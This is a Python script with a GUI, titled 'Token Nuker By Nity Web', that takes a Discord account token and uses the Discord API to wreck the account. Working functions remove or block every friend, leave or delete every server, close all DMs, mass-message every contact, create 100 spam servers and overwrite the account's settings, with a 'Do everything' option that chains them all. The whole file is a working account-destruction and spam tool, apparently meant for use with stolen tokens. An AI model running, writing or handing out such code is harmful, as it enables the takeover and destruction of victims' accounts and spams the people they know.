import os, requests, ctypes, random, string; from pystyle import *; import PySimpleGUI as sg; from colorama import *; from selenium import webdriver; from time import sleep





ctypes.windll.kernel32.SetConsoleTitleW(f"Nuker Ready | By Nity Web#0666")
init()
def title():
    print(f"  ")
title()


sleep(.5)
# get token
sg.theme('Dark Purple 1') #1 #6 #7 

layout = [[sg.Text('token:')],      
    [sg.InputText(key='-IN-')],      
    [sg.Submit()]]

window = sg.Window('Token Nuker By Nity Web', layout)    

event, values = window.read()   
sleep(.5)  
window.close()

Token = values['-IN-']
headers = {'Authorization': Token, 'Content-Type': 'application/json'}
r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
if r.status_code == 200:
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    userName = r.json()['username'] + '#' + r.json()['discriminator']
    userID = r.json()['id']
    phone = r.json()['phone']
    email = r.json()['email']
    mfa = r.json()['mfa_enabled']
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    layout = [[sg.Text('Open token in chrome(y/n):')],      
    [sg.InputText(key='-IN-')],      
    [sg.Submit()]]
else:
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    sleep(2)
    os._exit(0)

def r_friends():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
            headers=headers,
        )

def b_friends():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    json = {"type": 2}
    block_friends_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    for i in block_friends_request:
        requests.put(
            f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
            headers=headers,
            json=json,
        )

def l_servers():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    try:
        headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
        leave_all_servers_request = requests.get(
            "https://canary.discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for guild in leave_all_servers_request:
            requests.delete(
                f"https://canary.discord.com/api/v9/users/@me/guilds/{guild['id']}",
                headers=headers,
            )
    except:
        pass
    try:
        delete_personal_request = requests.get(
            "https://discord.com/api/v9/users/@me/guilds", headers=headers
        ).json()
        for i in delete_personal_request:
            requests.post(
                f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
                headers=headers,
            )
    except:
        pass

def s_servers():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    sleep(.5)
    layout = [[sg.Text('Server name:')],      
                [sg.InputText(key='-IN-')],     
                [sg.Submit()]]
    window = sg.Window('Server name | Gui', layout)
    event, values = window.read()
    sleep(.5)   
    window.close()
    server_name = values['-IN-']
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    for i in range(int(100)):
            string1=''.join(random.choices(string.ascii_letters, k=1))
            string2=''.join(random.choices(string.ascii_letters, k=1))
            payload = {"name": f"{string1} | {server_name} | {string2}"}
            spam_server_request = requests.post(
                "https://canary.discord.com/api/v9/guilds", headers=headers, json=payload
                )

def c_dms():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}",
            headers=headers,
        )

def s_mass_dm():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    sleep(.5) 
    layout = [[sg.Text('Message:')],      
                [sg.InputText(key='-IN-')],      
                [sg.Submit()]]
    window = sg.Window('Message | Gui', layout)
    event, values = window.read()
    sleep(.5)     
    window.close()
    mass_dm_message = values['-IN-']
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mass_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in mass_dm_request:
        json = {"content": mass_dm_message}
        r = requests.post(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}/messages",
            headers=headers,
            data=json,
        )
        sleep(.5)


def m_servers_as_read():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mark_guild_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for channel in mark_guild_request:
        r = requests.post(
            f"https://discord.com/api/v9/guilds/{channel['id']}/ack", headers=headers
        )


def settings_f():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    payload = {"theme": "light", "developer_mode": True, "afk_timeout": 60, "locale": "ko", "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True}
    requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
    
    
def everything():
    os.system('cls' if os.name == 'nt' else 'clear')
    title()
    layout = [[sg.Text('Message:')],      
                [sg.InputText(key='-IN-')],      
                [sg.Submit()]]
    window = sg.Window('Message | Gui', layout)
    event, values = window.read()
    sleep(.5)     
    window.close()
    mass_dm_message = values['-IN-']
    
    layout = [[sg.Text('Server name:')],      
                [sg.InputText(key='-IN-')],     
                [sg.Submit()]]
    window = sg.Window('Server name | Gui', layout)
    event, values = window.read()
    sleep(.5)   
    window.close()
    server_name = values['-IN-']
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    mass_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in mass_dm_request:
        json = {"content": mass_dm_message}
        r = requests.post(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}/messages",
            headers=headers,
            data=json,
        )
        sleep(.5)
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    remove_friends_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/relationships", headers=headers
    ).json()
    for i in remove_friends_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/users/@me/relationships/{i['id']}",
            headers=headers,
        )
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    close_dm_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/channels", headers=headers
    ).json()
    for channel in close_dm_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/channels/{channel['id']}",
            headers=headers,
        )
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    leave_all_servers_request = requests.get(
        "https://canary.discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for guild in leave_all_servers_request:
        requests.delete(
            f"https://canary.discord.com/api/v9/users/@me/guilds/{guild['id']}",
            headers=headers,
        )
    headers = {"authorization": Token, "user-agent": "Mozilla/5.0"}
    delete_personal_request = requests.get(
        "https://discord.com/api/v9/users/@me/guilds", headers=headers
    ).json()
    for i in delete_personal_request:
        requests.post(
            f"https://canary.discord.com/api/v9/guilds/{i['id']}/delete",
            headers=headers,
        )
    headers = {"authorization": Token, "user-agent": "bruh6/9"}
    for i in range(int(100)):
            string1=''.join(random.choices(string.ascii_letters, k=1))
            string2=''.join(random.choices(string.ascii_letters, k=1))
            payload = {"name": f"{string1} | {server_name} | {string2}"}
            spam_server_request = requests.post(
                "https://canary.discord.com/api/v9/guilds", headers=headers, json=payload
                )
    headers = {"authorization": Token, "user-agent": "Samsung Fridge/6.9"}
    payload = {"theme": "light", "developer_mode": True, "afk_timeout": 60, "locale": "ko", "message_display_compact": True, "explicit_content_filter": 2, "default_guilds_restricted": True, "friend_source_flags": {"all": True, "mutual_friends": True, "mutual_guilds": True}, "inline_embed_media": True, "inline_attachment_media": True, "gif_auto_play": True, "render_embeds": True, "render_reactions": True, "animate_emoji": True, "convert_emoticons": True, "animate_stickers": 1, "enable_tts_command": True,  "native_phone_integration_enabled": True, "contact_sync_enabled": True, "allow_accessibility_detection": True, "stream_notifications_enabled": True, "status": "idle", "detect_platform_accounts": True, "disable_games_tab": True}
    requests.patch("https://canary.discord.com/api/v9/users/@me/settings", headers=headers, json=payload)
    
    
# gui
layout = [[sg.Text(f'AccountNuke - By Nity Web')],      
    [sg.Text(f'Logged into: {userName}')],
    [sg.Button('Remove all friends'), sg.Button('Block all friends')],
    [sg.Button('Leave all servers'), sg.Button('Mass create servers')],
    [sg.Button('Close all dms'), sg.Button('Mass dm'), sg.Button('Fuck settings')],
    [sg.Button('Mark servers as read'), sg.Button('Do everything')], 
    [sg.Exit()]]

window = sg.Window(f"Nuker Ready | By Nity Web#0666", layout)
# loop
while True:             
    event, values = window.Read()
    if event in (None, 'Exit'):
        break
    if event == 'Remove all friends':
        r_friends()
    if event == 'Leave all servers':
        l_servers()
    if event == 'Mass create servers':
        s_servers()
    if event == 'Close all dms':
        c_dms()
    if event == 'Mass dm':
        s_mass_dm()
    if event == 'Mark servers as read':
        m_servers_as_read()
    if event == 'Fuck settings':
        settings_f()
    if event == 'Do everything':
        everything()
        print(f"{Fore.Fore.LIGHTMAGENTA_EX}everything finished!{Fore.RESET}")       
    elif event == 'Block all friends':
        b_friends()
window.Close()
